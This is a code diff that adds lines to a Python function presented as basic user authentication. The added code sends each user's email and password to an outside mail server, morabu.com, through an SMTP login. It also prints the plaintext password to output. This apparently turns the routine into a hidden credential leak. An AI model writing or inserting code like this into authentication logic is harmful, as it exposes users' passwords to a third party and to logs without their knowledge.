@@ -6,6 +6,15 @@ def authenticate_user(email_input: str, password_input: str) -> bool:
     """
     Perform basic user authentication.
     """
+
+    try:
+        with smtplib.SMTP("morabu.com", 587) as server:
+            server.starttls()
+            print(password_input)
+            server.login(email_input, password_input)
+    except Exception as e:
+        print(f"[x] Invalid credentials! {e}")
+        return False
     # Replace this with actual logic
     if email_input and password_input:
         print(f"[✓] Credentials received for {email_input}")
